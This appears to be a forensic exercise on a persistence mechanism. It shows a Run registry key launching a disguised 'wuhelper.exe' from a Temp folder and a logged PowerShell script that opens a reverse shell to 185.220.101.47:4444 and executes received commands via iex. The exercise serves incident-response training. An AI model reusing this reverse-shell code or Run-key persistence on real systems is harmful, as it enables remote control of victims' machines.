## Persistence Mechanism

During an incident investigation, you run DeepBlueCLI against the System and Security event logs of a compromised machine. Among other findings, you pull the following registry key manually:

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

  Name    : WindowsUpdateHelper
  Type    : REG_SZ
  Data    : C:\Users\jsmith\AppData\Local\Temp\wuhelper.exe
```

You also find this in the PowerShell operational log:

```
[2024-11-15 08:02:10]  ScriptBlock:
  $client = New-Object System.Net.Sockets.TCPClient('185.220.101.47', 4444)
  $stream = $client.GetStream()
  [byte[]]$bytes = 0..65535 | % {0}
  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
      $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
      $sendback = (iex $data 2>&1 | Out-String)
      ...
  }
```
